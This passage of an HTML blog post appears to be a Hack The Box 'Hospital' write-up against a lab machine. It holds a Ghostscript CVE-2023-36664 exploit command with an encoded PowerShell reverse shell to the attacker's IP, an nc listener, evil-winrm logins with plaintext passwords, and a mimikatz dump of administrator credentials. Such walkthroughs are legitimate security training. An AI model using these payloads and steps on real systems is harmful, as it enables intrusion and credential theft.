+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 CVE_2023_36664_exploit.py --generate --payload <span style="color:#e6db74">&#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAxACIALAA4ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#34;</span> --filename <span style="color:#e6db74">&#34;needle&#34;</span> --extension eps<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generated EPS payload file: needle.eps
+</span></span></code></pre></div><p>And our <code>nc</code> listener gets a call back</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">8443</span>
+</span></span><span style="display:flex;"><span>listening on [any] 8443 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.51] from (UNKNOWN) [10.10.11.241] 30881
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>hospital\drbrown
+</span></span><span style="display:flex;"><span>PS C:\Users\drbrown.HOSPITAL\Documents&gt;
+</span></span></code></pre></div><p>Now we can grab the user flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\drbrown.HOSPITAL\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>62437b4d121f0c75702f9af8d94058d0
+</span></span></code></pre></div><p>This might also be the password (<code>chr!$br0wn</code>) for <code>drbrown</code> in the <code>bat</code> script that runs any <code>eps</code> file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\drbrown.HOSPITAL\Documents&gt; type ghostscript.bat
+</span></span><span style="display:flex;"><span>@echo off
+</span></span><span style="display:flex;"><span>set filename=%~<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>powershell -command <span style="color:#e6db74">&#34;</span>$p<span style="color:#e6db74"> = convertto-securestring &#39;chr!</span>$br0wn<span style="color:#e6db74">&#39; -asplain -force;</span>$c<span style="color:#e6db74"> = new-object system.management.automation.pscredential(&#39;hospital\drbrown&#39;, </span>$p<span style="color:#e6db74">);Invoke-Command -ComputerName dc -Credential </span>$c<span style="color:#e6db74"> -ScriptBlock { cmd.exe /c &#34;</span>C:\Program` Files\gs\gs10.01.<span style="color:#ae81ff">1</span>\bin\gswin64c.exe<span style="color:#e6db74">&#34; -dNOSAFER &#34;</span>C:\Users\drbrown.HOSPITAL\Downloads\<span style="color:#66d9ef">%</span>filename%<span style="color:#e6db74">&#34; }&#34;</span>
+</span></span></code></pre></div><p><code>drbrown</code> is a member of <code>Remote Management Users</code> which means we can use <code>evil-winrm</code> to remote in since we have the password now and a more persistent, stable shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.11.241 -u drbrown -p <span style="color:#e6db74">&#39;chr!$br0wn&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents&gt;
+</span></span></code></pre></div><p>While doing our normal enumeration, we run <code>SharpUp</code>, and notice a possible unquoted path</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\drbrown.HOSPITAL&gt; ./SharpUp.exe audit
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>=== SharpUp<span style="color:#960050;background-color:#1e0010">:</span> Running Privilege Escalation Checks ===
+</span></span><span style="display:flex;"><span>[!] Modifialbe scheduled tasks were not evaluated due to permissions.
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">X</span>] Unhandled exception <span style="color:#66d9ef">in</span> ModifiableServices<span style="color:#960050;background-color:#1e0010">:</span> Exception has been thrown by the target of an invocation.
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">X</span>] Unhandled exception <span style="color:#66d9ef">in</span> ModifiableServiceRegistryKeys<span style="color:#960050;background-color:#1e0010">:</span> Exception has been thrown by the target of an invocation.
+</span></span><span style="display:flex;"><span>Registry AutoLogon Found
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>=== Registry AutoLogons ===
+</span></span><span style="display:flex;"><span>        DefaultDomainName<span style="color:#960050;background-color:#1e0010">:</span> HOSPITAL
+</span></span><span style="display:flex;"><span>        DefaultUserName<span style="color:#960050;background-color:#1e0010">:</span> drbrown
+</span></span><span style="display:flex;"><span>        DefaultPassword<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>        AltDefaultDomainName<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>        AltDefaultUserName<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>        AltDefaultPassword<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>=== Services with Unquoted Paths ===
+</span></span><span style="display:flex;"><span>        Service <span style="color:#e6db74">&#39;c2wts&#39;</span> (StartMode<span style="color:#960050;background-color:#1e0010">:</span> Manual) has executable <span style="color:#e6db74">&#39;C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe&#39;</span>, but <span style="color:#e6db74">&#39;C:\Program&#39;</span> is modifable.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Completed Privesc Checks <span style="color:#66d9ef">in</span> <span style="color:#ae81ff">5</span> seconds
+</span></span></code></pre></div><p>And we can create the directory <code>C:\Program</code>, but we don&rsquo;t have permissions to restart the service. We also log into his email, but only see the emails we sent from <code>drwilliams</code>. Let&rsquo;s RDP in and see if we can find anything using a GUI. Immediately upon logging in, we see Internet Explorer is open and the admin user&rsquo;s credentials are cached
+<img src="/images/Hospital/rdp.png" alt="RDP"></p>
+<p>We can use <code>mimikatz</code> to extract the credentials,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>mimikatz # vault::list
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Vault : {4bf4c442-9b8a-41a0-b380-dd4a704ddb28}
+</span></span><span style="display:flex;"><span>        Name       : Web Credentials
+</span></span><span style="display:flex;"><span>        Path       : C:\Users\drbrown.HOSPITAL\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+</span></span><span style="display:flex;"><span>        Items (1)
+</span></span><span style="display:flex;"><span>          0.    Internet Explorer
+</span></span><span style="display:flex;"><span>                Type            : {3ccd5499-87a8-4b10-a215-608888dd3b55}
+</span></span><span style="display:flex;"><span>                LastWritten     : 3/18/2025 5:31:47 PM
+</span></span><span style="display:flex;"><span>                Flags           : 00000400
+</span></span><span style="display:flex;"><span>                Ressource       : [STRING] https://localhost/
+</span></span><span style="display:flex;"><span>                Identity        : [STRING] Administrator
+</span></span><span style="display:flex;"><span>                Authenticator   :
+</span></span><span style="display:flex;"><span>                PackageSid      :
+</span></span><span style="display:flex;"><span>                *Authenticator* : [STRING] Th3B3stH0sp1t4l9786!
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Vault : {77bc582b-f0a6-4e15-4e80-61736b6f3b29}
+</span></span><span style="display:flex;"><span>        Name       : Windows Credentials
+</span></span><span style="display:flex;"><span>        Path       : C:\Users\drbrown.HOSPITAL\AppData\Local\Microsoft\Vault
+</span></span><span style="display:flex;"><span>        Items (0)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>mimikatz #
+</span></span></code></pre></div><p>Also, apparently a script is running at some time interval which types out the admin credentials. Then we can <code>evil-winrm</code> in as the administrator and grab the root flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+</span></span><span style="display:flex;"><span>67cb668e700215b848ae24645e5cc5b7
+</span></span></code></pre></div>
+</content>
+<p>
+  
+  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
+  
+  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
